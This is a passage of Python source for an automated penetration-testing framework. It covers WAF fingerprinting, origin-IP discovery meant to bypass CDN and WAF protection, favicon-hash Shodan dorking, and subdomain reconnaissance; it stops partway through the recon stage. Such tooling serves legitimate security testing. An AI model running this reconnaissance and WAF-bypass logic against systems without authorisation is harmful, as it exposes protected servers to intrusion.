#!/usr/bin/env python3
"""
OMNISCIENCE — Automated Penetration Testing Engine v6.0
Advanced multi-stage VAPT framework with complete vulnerability coverage.
Triggered by Telegram → GitHub Actions → Cloudflare Workers → GAS → Google Docs/Drive/Sheets.
"""

import os
import sys
import re
import json
import time
import hashlib
import base64
import ipaddress
import urllib.parse
import subprocess
import tempfile
import shutil
import csv
import io
import random
import string
import struct
import socket
import ssl
import dns.resolver
import dns.zone
import dns.query
import dns.name
from datetime import datetime, timezone
from typing import List, Dict, Optional, Tuple, Any, Set
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed, wait, FIRST_COMPLETED
from urllib.parse import urlparse, urljoin, quote, unquote, parse_qs, urlencode

import requests
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry

# AI Analysis
import google.generativeai as genai

# Optional imports with graceful fallbacks
try:
    from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeout
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

try:
    import mmh3
    MMH3_AVAILABLE = True
except ImportError:
    MMH3_AVAILABLE = False

try:
    from bs4 import BeautifulSoup
    BS4_AVAILABLE = True
except ImportError:
    BS4_AVAILABLE = False

try:
    from selenium import webdriver
    from selenium.webdriver.chrome.options import Options
    SELENIUM_AVAILABLE = True
except ImportError:
    SELENIUM_AVAILABLE = False

try:
    from shodan import Shodan
    SHODAN_AVAILABLE = True
except ImportError:
    SHODAN_AVAILABLE = False

try:
    from censys.search import CensysHosts
    CENSYS_AVAILABLE = True
except ImportError:
    CENSYS_AVAILABLE = False

try:
    import whois
    WHOIS_AVAILABLE = True
except ImportError:
    WHOIS_AVAILABLE = False

try:
    from cryptography import x509
    from cryptography.hazmat.backends import default_backend
    CRYPTO_AVAILABLE = True
except ImportError:
    CRYPTO_AVAILABLE = False

try:
    import OpenSSL
    OPENSSL_AVAILABLE = True
except ImportError:
    OPENSSL_AVAILABLE = False

try:
    from idna import decode as idna_decode, encode as idna_encode
    IDNA_AVAILABLE = True
except ImportError:
    IDNA_AVAILABLE = False


# ═══════════════════════════════════════════════════════════════════════
# CONFIGURATION
# ═══════════════════════════════════════════════════════════════════════

class Config:
    """Central configuration for OMNISCIENCE engine."""
    
    # API Keys
    GEMINI_API_KEY = os.environ.get("GEMINI_API_KEY", "")
    SHODAN_API_KEY = os.environ.get("SHODAN_API_KEY", "")
    CENSYS_API_ID = os.environ.get("CENSYS_API_ID", "")
    CENSYS_API_SECRET = os.environ.get("CENSYS_API_SECRET", "")
    GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "")
    TELEGRAM_BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
    TELEGRAM_CHAT_ID = os.environ.get("TELEGRAM_CHAT_ID", "")
    VIRUSTOTAL_API_KEY = os.environ.get("VIRUSTOTAL_API_KEY", "")
    SECURITYTRAILS_API_KEY = os.environ.get("SECURITYTRAILS_API_KEY", "")
    WHOISXML_API_KEY = os.environ.get("WHOISXML_API_KEY", "")
    ABSTRACT_API_KEY = os.environ.get("ABSTRACT_API_KEY", "")
    
    # Delivery
    CLOUDFLARE_WORKER_URL = os.environ.get("CLOUDFLARE_WORKER_URL", "")
    
    # False positive patterns (passed from Google Sheets via env)
    FALSE_PATTERNS_RAW = os.environ.get("FALSE_PATTERNS", "")
    FALSE_PATTERNS = [p.strip().lower() for p in FALSE_PATTERNS_RAW.split(",") if p.strip()]
    
    # Targets
    TARGET = os.environ.get("TARGET", "")
    TARGET_NAME = os.environ.get("TARGET_NAME", "")
    
    # Scanning options
    THREADS = int(os.environ.get("THREADS", "25"))
    TIMEOUT = int(os.environ.get("TIMEOUT", "15"))
    MAX_RETRIES = int(os.environ.get("MAX_RETRIES", "3"))
    RATE_LIMIT_DELAY = float(os.environ.get("RATE_LIMIT_DELAY", "0.5"))
    SCAN_ALL_PORTS = os.environ.get("SCAN_ALL_PORTS", "false").lower() == "true"
    PORT_SCAN_RANGE = os.environ.get("PORT_SCAN_RANGE", "1-65535" if os.environ.get("SCAN_ALL_PORTS", "false").lower() == "true" else "80,443,8080,8443,22,21,25,53,110,143,389,445,3389,5900,6379,27017,3306,5432,9200,11211,1883,8883")
    DEEP_SCAN = os.environ.get("DEEP_SCAN", "false").lower() == "true"
    RECURSIVE_DEPTH = int(os.environ.get("RECURSIVE_DEPTH", "2"))
    JS_DEEP_ANALYSIS = os.environ.get("JS_DEEP_ANALYSIS", "true").lower() == "true"
    FAVICON_ANALYSIS = os.environ.get("FAVICON_ANALYSIS", "true").lower() == "true"
    CORS_DEEP_SCAN = os.environ.get("CORS_DEEP_SCAN", "true").lower() == "true"
    WAF_DETECTION = os.environ.get("WAF_DETECTION", "true").lower() == "true"
    WEBSOCKET_SCAN = os.environ.get("WEBSOCKET_SCAN", "true").lower() == "true"
    API_DISCOVERY = os.environ.get("API_DISCOVERY", "true").lower() == "true"
    JWT_TESTING = os.environ.get("JWT_TESTING", "true").lower() == "true"
    GRAPHQL_TESTING = os.environ.get("GRAPHQL_TESTING", "true").lower() == "true"
    SSTI_TESTING = os.environ.get("SSTI_TESTING", "true").lower() == "true"
    SSRF_TESTING = os.environ.get("SSRF_TESTING", "true").lower() == "true"
    CLOUD_ENUM = os.environ.get("CLOUD_ENUM", "true").lower() == "true"
    HOMOGRAPH_DETECT = os.environ.get("HOMOGRAPH_DETECT", "true").lower() == "true"
    OSINT_DEEP = os.environ.get("OSINT_DEEP", "true").lower() == "true"
    CERTIFICATE_ANALYSIS = os.environ.get("CERTIFICATE_ANALYSIS", "true").lower() == "true"
    RATE_LIMIT_AWARE = os.environ.get("RATE_LIMIT_AWARE", "true").lower() == "true"
    
    # Wordlists (bundled or paths)
    WORDLIST_DIR = os.environ.get("WORDLIST_DIR", "/usr/share/wordlists")
    DIRBUSTER_WORDLIST = os.environ.get("DIRBUSTER_WORDLIST", "/usr/share/wordlists/dirb/common.txt")
    SUBDOMAIN_WORDLIST = os.environ.get("SUBDOMAIN_WORDLIST", "/usr/share/wordlists/subdomains.txt")
    
    # Screenshots
    MAX_SCREENSHOTS = int(os.environ.get("MAX_SCREENSHOTS", "5"))
    SCREENSHOT_WIDTH = int(os.environ.get("SCREENSHOT_WIDTH", "1280"))
    SCREENSHOT_HEIGHT = int(os.environ.get("SCREENSHOT_HEIGHT", "720"))
    
    @classmethod
    def is_configured(cls) -> bool:
        return bool(cls.TARGET and cls.GEMINI_API_KEY and cls.CLOUDFLARE_WORKER_URL)


# ═══════════════════════════════════════════════════════════════════════
# UTILITY FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════

class Utils:
    """Shared utility functions."""
    
    @staticmethod
    def get_session(retries: int = 3, backoff: float = 0.5) -> requests.Session:
        """Get a requests session with retry strategy and rate limiting."""
        session = requests.Session()
        retry_strategy = Retry(
            total=retries,
            backoff_factor=backoff,
            status_forcelist=[429, 500, 502, 503, 504],
            allowed_methods=["HEAD", "GET", "POST", "PUT", "DELETE", "OPTIONS", "PATCH"]
        )
        adapter = HTTPAdapter(max_retries=retry_strategy, pool_connections=50, pool_maxsize=100)
        session.mount("http://", adapter)
        session.mount("https://", adapter)
        session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Accept-Encoding": "gzip, deflate",
            "DNT": "1",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        return session
    
    @staticmethod
    def safe_request(method: str, url: str, session: requests.Session = None, **kwargs):
        """Make an HTTP request with error handling and rate limiting."""
        if Config.RATE_LIMIT_AWARE:
            time.sleep(Config.RATE_LIMIT_DELAY + random.uniform(0, 0.3))
        close_session = False
        if session is None:
            session = Utils.get_session()
            close_session = True
        try:
            kwargs.setdefault("timeout", Config.TIMEOUT)
            kwargs.setdefault("allow_redirects", True)
            kwargs.setdefault("verify", False)
            resp = session.request(method, url, **kwargs)
            return resp
        except requests.exceptions.RequestException:
            return None
        finally:
            if close_session:
                session.close()
    
    @staticmethod
    def get(url: str, **kwargs):
        return Utils.safe_request("GET", url, **kwargs)
    
    @staticmethod
    def post(url: str, **kwargs):
        return Utils.safe_request("POST", url, **kwargs)
    
    @staticmethod
    def head(url: str, **kwargs):
        return Utils.safe_request("HEAD", url, **kwargs)
    
    @staticmethod
    def options_request(url: str, **kwargs):
        return Utils.safe_request("OPTIONS", url, **kwargs)
    
    @staticmethod
    def is_false_positive(text: str) -> bool:
        """Check if text matches any known false positive pattern."""
        if not Config.FALSE_PATTERNS:
            return False
        text_lower = text.lower()
        for pattern in Config.FALSE_PATTERNS:
            if pattern in text_lower:
                return True
        return False
    
    @staticmethod
    def normalize_url(url_str: str) -> str:
        """Normalize URL to ensure proper format."""
        url_str = url_str.strip()
        if not url_str.startswith(("http://", "https://")):
            url_str = f"https://{url_str}"
        parsed = urlparse(url_str)
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path or '/'}"
    
    @staticmethod
    def is_valid_domain(domain: str) -> bool:
        """Basic domain validation."""
        pattern = re.compile(
            r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
        )
        return bool(pattern.match(domain))
    
    @staticmethod
    def extract_domain(url_str: str) -> str:
        """Extract clean domain from URL."""
        parsed = urlparse(Utils.normalize_url(url_str))
        return parsed.netloc
    
    @staticmethod
    def run_command(cmd: List[str], timeout: int = 120, cwd: str = None) -> Tuple[str, str, int]:
        """Run a shell command safely and return stdout, stderr, returncode."""
        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=timeout,
                cwd=cwd,
                env={**os.environ, "PYTHONUNBUFFERED": "1"}
            )
            return result.stdout, result.stderr, result.returncode
        except subprocess.TimeoutExpired:
            return "", "TIMEOUT", -1
        except FileNotFoundError:
            return "", f"Command not found: {cmd[0]}", -1
        except Exception as e:
            return "", str(e), -1
    
    @staticmethod
    def chunk_list(lst: List, chunk_size: int) -> List[List]:
        """Split a list into chunks."""
        return [lst[i:i + chunk_size] for i in range(0, len(lst), chunk_size)]
    
    @staticmethod
    def is_alive(url: str) -> bool:
        """Check if a URL responds."""
        try:
            resp = Utils.head(url)
            return resp is not None and resp.status_code < 500
        except:
            return False
    
    @staticmethod
    def hash_text(text: str) -> str:
        return hashlib.sha256(text.encode()).hexdigest()[:16]
    
    @staticmethod
    def extract_tech_stack(headers: Dict, body: str = "") -> List[str]:
        """Extract technology stack from HTTP headers and body."""
        tech = []
        headers_lower = {k.lower(): v for k, v in headers.items()}
        # Server header
        server = headers_lower.get("server", "")
        if server:
            tech.append(f"Server:{server}")
        # X-Powered-By
        powered = headers_lower.get("x-powered-by", "")
        if powered:
            tech.append(f"PoweredBy:{powered}")
        # Set-Cookie analysis
        set_cookie = headers_lower.get("set-cookie", "")
        if "PHPSESSID" in set_cookie:
            tech.append("PHP")
        if "JSESSIONID" in set_cookie or "JSESSIONIDSSO" in set_cookie:
            tech.append("Java/J2EE")
        if "ASP.NET_SessionId" in set_cookie or "ASPSESSIONID" in set_cookie:
            tech.append("ASP.NET")
        if "CFID" in set_cookie and "CFTOKEN" in set_cookie:
            tech.append("ColdFusion")
        # Body analysis
        if body:
            if "wp-content" in body or "wp-includes" in body:
                tech.append("WordPress")
            if "csrf-token" in body and "django" in body.lower():
                tech.append("Django")
            if "laravel" in body.lower():
                tech.append("Laravel")
            if "rails" in body.lower() or "ruby" in body.lower():
                tech.append("RubyOnRails")
            if "ng-app" in body or "angular" in body.lower():
                tech.append("AngularJS")
            if "react" in body.lower() or "react-dom" in body.lower():
                tech.append("React")
            if "vue" in body.lower():
                tech.append("Vue.js")
            if "graphql" in body.lower():
                tech.append("GraphQL")
            if "swagger" in body.lower() or "openapi" in body.lower():
                tech.append("Swagger/OpenAPI")
        # CDN detection
        cf_ray = headers_lower.get("cf-ray", "")
        if cf_ray:
            tech.append("Cloudflare")
        akamai = headers_lower.get("x-akamai-transformed", "")
        if akamai:
            tech.append("Akamai")
        fastly = headers_lower.get("x-fastly-request-id", "")
        if fastly:
            tech.append("Fastly")
        # Security headers
        if headers_lower.get("strict-transport-security", ""):
            tech.append("HSTS")
        if headers_lower.get("content-security-policy", ""):
            tech.append("CSP")
        if headers_lower.get("x-content-type-options", ""):
            tech.append("X-Content-Type-Options")
        if headers_lower.get("x-frame-options", ""):
            tech.append("X-Frame-Options")
        return list(set(tech))


# ═══════════════════════════════════════════════════════════════════════
# STAGE 0: WAF DETECTION & BYPASS
# ═══════════════════════════════════════════════════════════════════════

class WAFDetector:
    """Detect Web Application Firewalls and attempt to find origin IP for bypass."""
    
    WAF_SIGNATURES = {
        "Cloudflare": [
            ("server", "cloudflare"), ("cf-ray", ""), 
            ("__cfduid", ""), ("cf-cache-status", "")
        ],
        "Akamai": [
            ("server", "akamai"), ("x-akamai", ""), ("x-akamai-transformed", "")
        ],
        "AWS WAF": [
            ("x-amzn-trace-id", ""), ("x-amz-cf-id", ""),
            ("x-amz-cf-pop", "")
        ],
        "F5 BIG-IP ASM": [
            ("x-asm-version", ""), ("x-wa-info", ""),
            ("x-application-context", "")
        ],
        "Imperva/Incapsula": [
            ("x-iinfo", ""), ("incapsula", ""), ("x-cdn", "incapsula")
        ],
        "ModSecurity": [
            ("server", "mod_security"), ("server", "modsecurity"),
            ("x-mod-sec", "")
        ],
        "Sucuri": [
            ("x-sucuri-id", ""), ("x-sucuri-cache", ""), ("sucuri", "")
        ],
        "Barracuda": [
            ("x-barracuda", ""), ("barracuda", "")
        ],
        "Citrix Netscaler": [
            ("x-netscaler", ""), ("ns_server", "")
        ],
        "Radware": [
            ("x-rdwr", ""), ("x-cnection", ""), ("x-slab", "")
        ],
        "Fortinet FortiWeb": [
            ("x-fortitech", ""), ("fortiweb", "")
        ],
        "Comodo WAF": [
            ("x-cwaf", ""), ("x-comodo-waf", "")
        ],
        "Wordfence": [
            ("x-wordfence", "")
        ],
        "StackPath": [
            ("x-stackpath", "")
        ],
        "Reblaze": [
            ("x-reblaze", "")
        ],
        "Varnish": [
            ("via", "varnish"), ("x-varnish", "")
        ],
    }
    
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.detected_wafs = []
        self.origin_ips = []
        self.bypass_methods = []
    
    def detect(self) -> Dict:
        """Run full WAF detection and origin IP discovery."""
        result = {
            "waf_detected": False,
            "waf_names": [],
            "waf_signatures": [],
            "origin_ips": [],
            "bypass_suggestions": [],
            "details": ""
        }
        
        # Phase 1: Header-based WAF detection
        resp = Utils.get(self.target, session=self.session)
        if not resp:
            return result
        
        headers_str = "\n".join([f"{k}: {v}" for k, v in resp.headers.items()])
        cookies_str = "; ".join([f"{c.name}={c.value}" for c in resp.cookies]) if hasattr(resp, 'cookies') else ""
        
        for waf_name, signatures in self.WAF_SIGNATURES.items():
            for sig_type, sig_value in signatures:
                found = False
                if sig_type == "server" and resp.headers.get("Server", "").lower() == sig_value.lower():
                    found = True
                elif sig_type == "cookie":
                    for cookie in resp.cookies:
                        if sig_value.lower() in cookie.name.lower():
                            found = True
                            break
                else:
                    for header_key, header_val in resp.headers.items():
                        if sig_type.lower() == header_key.lower():
                            if not sig_value or sig_value.lower() in header_val.lower():
                                found = True
                                break
                if found:
                    self.detected_wafs.append(waf_name)
                    result["waf_names"].append(waf_name)
                    result["waf_signatures"].append(f"{sig_type}: {sig_value}")
                    break
        
        if self.detected_wafs:
            result["waf_detected"] = True
            result["waf_detected"] = True
            result["details"] += f"Detected WAF(s): {', '.join(self.detected_wafs)}\n"
        
        # Phase 2: Bypass - Check with common subdomains for origin IP
        result["origin_ips"] = self._find_origin_ips()
        
        # Phase 3: Generate bypass suggestions
        if "Cloudflare" in self.detected_wafs:
            result["bypass_suggestions"].extend([
                "Try CloudFail: https://github.com/m0rtem/CloudFail",
                "Check historical DNS: securitytrails.com, viewdns.info",
                "Try SSL certificate IP disclosure via censys.io",
                "Check subdomains: direct, ftp, mail, cpanel, webmail, portal",
                "Try Shodan search: ssl.cert.subject.cn:{domain}",
            ])
        if "Akamai" in self.detected_wafs:
            result["bypass_suggestions"].append("Check for Akamai Ghost IPs via historical DNS records")
        
        result["details"] += f"Origin IPs found: {len(self.origin_ips)}\n"
        if self.origin_ips:
            for ip_info in self.origin_ips[:5]:
                result["details"] += f"  - {ip_info}\n"
        
        return result
    
    def _find_origin_ips(self) -> List[str]:
        """Attempt to find origin server IPs for WAF bypass."""
        found_ips = []
        
        # Method 1: Check common subdomains that might bypass CDN
        bypass_subdomains = [
            f"direct.{self.domain}", f"ftp.{self.domain}", f"mail.{self.domain}",
            f"cpanel.{self.domain}", f"webmail.{self.domain}", f"portal.{self.domain}",
            f"admin.{self.domain}", f"cdn.{self.domain}", f"origin.{self.domain}",
            f"static.{self.domain}", f"img.{self.domain}", f"www.{self.domain}",
            f"m.{self.domain}", f"mobile.{self.domain}", f"api.{self.domain}",
            f"vpn.{self.domain}", f"remote.{self.domain}", f"ssh.{self.domain}",
            f"host.{self.domain}", f"server.{self.domain}", f"ns1.{self.domain}",
            f"ns2.{self.domain}", f"ns3.{self.domain}", f"ns4.{self.domain}",
        ]
        
        for sub in bypass_subdomains:
            try:
                ip = socket.gethostbyname(sub)
                if ip and not ip.startswith(("127.", "10.", "172.16.", "192.168.")):
                    # Check if this IP responds with our target
                    try:
                        direct_url = f"https://{ip}"
                        resp = Utils.get(direct_url, session=self.session, headers={"Host": self.domain}, timeout=5)
                        if resp and resp.status_code < 500:
                            ip_entry = f"{sub} -> {ip} (responds to direct connection)"
                            if ip_entry not in found_ips:
                                found_ips.append(ip_entry)
                        elif resp:
                            ip_entry = f"{sub} -> {ip} (status: {resp.status_code})"
                            if ip_entry not in found_ips:
                                found_ips.append(ip_entry)
                        else:
                            # Try HTTP as well
                            resp2 = Utils.get(f"http://{ip}", session=self.session, headers={"Host": self.domain}, timeout=5)
                            if resp2 and resp2.status_code < 500:
                                ip_entry = f"{sub} -> {ip} (responds HTTP)"
                                if ip_entry not in found_ips:
                                    found_ips.append(ip_entry)
                    except:
                        pass
            except:
                continue
        
        # Method 2: Historical DNS via SecurityTrails (if API key available)
        if Config.SECURITYTRAILS_API_KEY:
            try:
                resp = Utils.get(
                    f"https://api.securitytrails.com/v1/history/{self.domain}/dns/a",
                    headers={"APIKEY": Config.SECURITYTRAILS_API_KEY},
                    timeout=10
                )
                if resp and resp.status_code == 200:
                    data = resp.json()
                    for record in data.get("records", []):
                        ip = record.get("value", {}).get("ip", "")
                        if ip and ip not in [x.split(" -> ")[-1].split(" ")[0] for x in found_ips]:
                            found_ips.append(f"historical({record.get('date','')}) -> {ip}")
            except:
                pass
        
        # Method 3: Certificate Transparency logs for IP discovery
        try:
            resp = Utils.get(f"https://crt.sh/?q=%25.{self.domain}&output=json", timeout=15)
            if resp and resp.status_code == 200:
                certs = resp.json()
                for cert in certs[:50]:
                    name_value = cert.get("name_value", "")
                    if name_value.startswith("http://") or name_value.startswith("https://"):
                        parsed = urlparse(name_value)
                        name_value = parsed.netloc if parsed.netloc else name_value
                    try:
                        ip = socket.gethostbyname(name_value.split("\n")[0])
                        if ip and not ip.startswith(("127.", "10.", "172.16.", "192.168.")):
                            entry = f"crt.sh:{name_value.split(chr(10))[0]} -> {ip}"
                            if entry not in found_ips:
                                found_ips.append(entry)
                    except:
                        continue
        except:
            pass
        
        # Method 4: Censys certificate search
        if Config.CENSYS_API_ID and Config.CENSYS_API_SECRET and CENSYS_AVAILABLE:
            try:
                c = CensysHosts(api_id=Config.CENSYS_API_ID, api_secret=Config.CENSYS_API_SECRET)
                query = f"services.service_name: HTTP AND services.tls.certificates.leaf_data.subject.common_name: \"{self.domain}\""
                results = c.search(query, per_page=10)
                for page in results:
                    for host in page:
                        ip = host.get("ip", "")
                        if ip:
                            entry = f"censys:tls -> {ip}"
                            if entry not in found_ips:
                                found_ips.append(entry)
                    break
            except:
                pass
        
        # Method 5: Shodan SSL search
        if Config.SHODAN_API_KEY and SHODAN_AVAILABLE:
            try:
                api = Shodan(Config.SHODAN_API_KEY)
                results = api.search(f"ssl.cert.subject.cn:{self.domain}", limit=10)
                for match in results.get("matches", []):
                    ip = match.get("ip_str", "")
                    if ip:
                        entry = f"shodan:ssl -> {ip}"
                        if entry not in found_ips:
                            found_ips.append(entry)
            except:
                pass
        
        self.origin_ips = found_ips
        return found_ips


# ═══════════════════════════════════════════════════════════════════════
# STAGE 0.5: FAVICON ANALYSIS & CDN BYPASS
# ═══════════════════════════════════════════════════════════════════════

class FaviconAnalyzer:
    """
    Favicon hash analysis for:
    - CDN origin IP discovery (Shodan dorking)
    - Technology fingerprinting
    - Phishing domain detection
    """
    
    # Known favicon hashes for technology fingerprinting
    KNOWN_FAVICON_HASHES = {
        -335242539: "F5 BIG-IP Load Balancer",
        -1833091792: "F5 BIG-IP (alt)",
        442997397: "F5 BIG-IP (v11+)",
        1065221574: "Cisco ASA",
        -1777400175: "Citrix NetScaler",
        1726794450: "Citrix (alt)",
        -157497014: "Joomla!",
        672823979: "Joomla! (alt)",
        -2135694421: "WordPress",
        1188644570: "WordPress (alt)",
        1712419232: "WordPress (admin)",
        208007969: "Drupal",
        1681636562: "Drupal (alt)",
        1583114672: "Magento",
        -1819530989: "Magento (alt)",
        1411131163: "Shopify",
        -1482528215: "Shopify (alt)",
        2101596047: "vBulletin",
        -759984199: "Atlassian Jira",
        161914507: "Atlassian Confluence",
        -329070762: "GitLab",
        373521798: "GitHub",
        -1603452268: "GitHub (Enterprise)",
        640977595: "Slack",
        269617629: "Trello",
        641187111: "Jenkins",
        1462983539: "Jenkins (alt)",
        -1015932809: "Docker",
        1340615621: "Kubernetes",
        880793428: "Grafana",
        173222992: "Prometheus",
        51912266: "PHPMyAdmin",
        -1424035157: "phpBB",
        -1843759689: "OpenCart",
        -1409662924: "PrestaShop",
        -830761271: "Salesforce",
        -1043212111: "Odoo",
        -1015932809: "Docker (alt)",
    }
    
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.favicon_urls = []
        self.hashes = {}
        self.technologies = []
        self.shodan_queries = []
    
    def analyze(self) -> Dict:
        """Full favicon analysis pipeline."""
        result = {
            "favicons_found": 0,
            "favicon_urls": [],
            "hashes": {},
            "technologies": [],
            "shodan_dorks": [],
            "potential_origin_ips": [],
            "details": ""
        }
        
        if not Config.FAVICON_ANALYSIS or not MMH3_AVAILABLE:
            result["details"] = "Favicon analysis skipped (mmh3 not available or disabled)"
            return result
        
        # Find favicon URLs
        self._discover_favicons()
        
        for fav_url in self.favicon_urls:
            fav_hash = self._calculate_hash(fav_url)
            if fav_hash is not None:
                self.hashes[fav_url] = fav_hash
                
                # Check against known fingerprints
                if fav_hash in self.KNOWN_FAVICON_HASHES:
                    tech = self.KNOWN_FAVICON_HASHES[fav_hash]
                    self.technologies.append(tech)
                    result["technologies"].append(f"{tech} (hash: {fav_hash})")
                
                # Generate Shodan dork
                shodan_dork = f"http.favicon.hash:{fav_hash}"
                self.shodan_queries.append(shodan_dork)
                result["shodan_dorks"].append(shodan_dork)
                
                # If Shodan API key available, query for origin IPs
                if Config.SHODAN_API_KEY and SHODAN_AVAILABLE:
                    origin_ips = self._query_shodan(fav_hash)
                    result["potential_origin_ips"].extend(origin_ips)
        
        result["favicons_found"] = len(self.favicon_urls)
        result["favicon_urls"] = self.favicon_urls
        result["hashes"] = self.hashes
        
        detail_lines = [f"Found {len(self.favicon_urls)} favicon(s)"]
        for url, h in self.hashes.items():
            detail_lines.append(f"  {url} -> hash: {h}")
        if self.technologies:
            detail_lines.append(f"Technologies identified: {', '.join(self.technologies)}")
        if result["potential_origin_ips"]:
            detail_lines.append(f"Potential origin IPs via Shodan: {', '.join(result['potential_origin_ips'][:5])}")
        result["details"] = "\n".join(detail_lines)
        
        return result
    
    def _discover_favicons(self):
        """Discover favicon URLs through multiple methods."""
        # Method 1: Standard location
        self.favicon_urls.append(urljoin(self.target, "/favicon.ico"))
        
        # Method 2: From HTML
        resp = Utils.get(self.target, session=self.session)
        if resp and resp.text:
            if BS4_AVAILABLE:
                soup = BeautifulSoup(resp.text, 'html.parser')
                # Link tags
                for link in soup.find_all('link', rel=lambda x: x and ('icon' in x.lower() or 'shortcut' in x.lower())):
                    href = link.get('href', '')
                    if href:
                        full_url = urljoin(self.target, href)
                        if full_url not in self.favicon_urls:
                            self.favicon_urls.append(full_url)
                # Meta tags with og:image
                for meta in soup.find_all('meta', property=lambda x: x and x.lower() == 'og:image'):
                    content = meta.get('content', '')
                    if content:
                        full_url = urljoin(self.target, content)
                        if full_url not in self.favicon_urls:
                            self.favicon_urls.append(full_url)
            else:
                # Regex fallback
                patterns = [
                    r'<link[^>]*rel=["\']?(?:shortcut\s+)?icon["\']?[^>]*href=["\']([^"\']+)["\']',
                    r'<link[^>]*href=["\']([^"\']+)["\']?[^>]*rel=["\']?(?:shortcut\s+)?icon["\']?',
                    r'<meta[^>]*property=["\']og:image["\'][^>]*content=["\']([^"\']+)["\']',
                ]
                for pattern in patterns:
                    matches = re.findall(pattern, resp.text, re.IGNORECASE)
                    for match in matches:
                        full_url = urljoin(self.target, match)
                        if full_url not in self.favicon_urls:
                            self.favicon_urls.append(full_url)
        
        # Method 3: apple-touch-icon
        if resp and resp.text and BS4_AVAILABLE:
            soup = BeautifulSoup(resp.text, 'html.parser')
            for link in soup.find_all('link', rel=lambda x: x and 'apple-touch-icon' in x.lower()):
                href = link.get('href', '')
                if href:
                    full_url = urljoin(self.target, href)
                    if full_url not in self.favicon_urls:
                        self.favicon_urls.append(full_url)
    
    def _calculate_hash(self, favicon_url: str) -> Optional[int]:
        """Calculate mmh3 hash of favicon for Shodan dorking."""
        try:
            resp = Utils.get(favicon_url, session=self.session, timeout=10)
            if resp and resp.status_code == 200 and len(resp.content) > 0:
                content = resp.content
                # Shodan format: base64 with newlines every 76 chars
                b64 = base64.b64encode(content).decode('utf-8')
                with_newlines = re.sub("(.{76}|$)", "\\1\n", b64, 0, re.DOTALL)
                hash_val = mmh3.hash(with_newlines)
                return hash_val
        except:
            pass
        return None
    
    def _query_shodan(self, fav_hash: int) -> List[str]:
        """Query Shodan for IPs with matching favicon hash."""
        ips = []
        try:
            api = Shodan(Config.SHODAN_API_KEY)
            results = api.search(f"http.favicon.hash:{fav_hash}", limit=20)
            for match in results.get("matches", []):
                ip = match.get("ip_str", "")
                port = match.get("port", "")
                if ip:
                    ips.append(f"{ip}:{port}")
        except:
            pass
        return ips


# ═══════════════════════════════════════════════════════════════════════
# STAGE 1: RECONNAISSANCE
# ═══════════════════════════════════════════════════════════════════════

class ReconEngine:
    """Multi-source subdomain discovery and reconnaissance."""
    
    def __init__(self, target: str):
        self.target = Utils.normalize_url(target)
        self.domain = Utils.extract_domain(target)
        self.session = Utils.get_session()
        self.subdomains = set()
        self.ips = {}
        self.cnames = {}
        self.dns_records = {"A": [], "AAAA": [], "CNAME": [], "MX": [], "NS": [], "TXT": [], "SOA": []}
        self.all_subdomains = set()
        self.wildcard_detected = False
    
    def run(self) -> Dict:
        """Execute full reconnaissance pipeline."""
        result = {
            "domain": self.domain,
            "subdomains_found": 0,
            "subdomains": [],
            "dns_records": {},
            "ip_mappings": {},
            "cname_mappings": {},
            "wildcard_detected": False,
            "details": ""
        }
        
        detail_lines = [f"=== RECONNAISSANCE for {self.domain} ==="]
        
        # Phase 1: crt.sh certificate transparency
        crt_subdomains = self._crt_sh_enum()
        detail_lines.append(f"crt.sh: {len(crt_subdomains)} subdomains")
        
        # Phase 2: Hackertarget enumeration
        ht_subdomains = self._hackertarget_enum()
        detail_lines.append(f"hackertarget: {len(ht_subdomains)} subdomains")
        
        # Phase 3: SecurityTrails (if API key)
        if Config.SECURITYTRAILS_API_KEY:
            st_subdomains = self._securitytrails_enum()
            detail_lines.append(f"securitytrails: {len(st_subdomains)} subdomains")
        
        # Phase 4: Google Dorking for subdomains
        gd_subdomains = self._google_dork_subdomains()
        detail_lines.append(f"google dorks: {len(gd_subdomains)} subdomains")
        
        # Phase 5: DNS brute force with wordlist
        if Config.SUBDOMAIN_WORDLIST and os.path.exists(Config.SUBDOMAIN_WORDLIST):
            bf_subdomains = self._dns_bruteforce()
            detail_lines.append(f"dns brute force: {len(bf_subdomains)} subdomains")
        else:
            bf_subdomains = set()
            detail_lines.append("dns brute force: skipped (wordlist not found)")
        
        # Phase 6: Additional DNS enumeration (CNAME, MX, NS, TXT)
        self._dns_enumeration()
        
        # Phase 7: Wildcard detection
        self._check_wildcard()
        
        # Combine all
        all_subs = crt_subdomains | ht_subdomains | gd_subdomains | bf_subdomains
        if Config.SECURITYTRAILS_API_KEY:
            all_subs |= set(st_subdomains)
        
        self.all_subdomains = all_subs
        self.subdomains = all_subs
        
        # Resolve IPs and CNAMEs
        for sub in list(all_subs)[:500]:  # Limit to 500 to avoid excessive lookups
            try:
                ip = socket.gethostbyname(sub)
                self.ips[sub] = ip
            except:
                pass
            try:
                answers = dns.resolver.resolve(sub, 'CNAME', lifetime=5)
                for ans in answers:
                    self.cnames[sub] = str(ans.target).rstrip('.')
            except:
                pass
        
        result["subdomains_found"] = len(all_subs)
        result["subdomains"] = sorted(all_subs)[:200]  # Limit output
        result["dns_records"] = {k: v[:20] for k, v in self.dns_records.items() if v}
        result["ip_mappings"] = dict(list(self.ips.items())[:100])
        result["cname_mappings"] = dict(list(self.cnames.items())[:50])
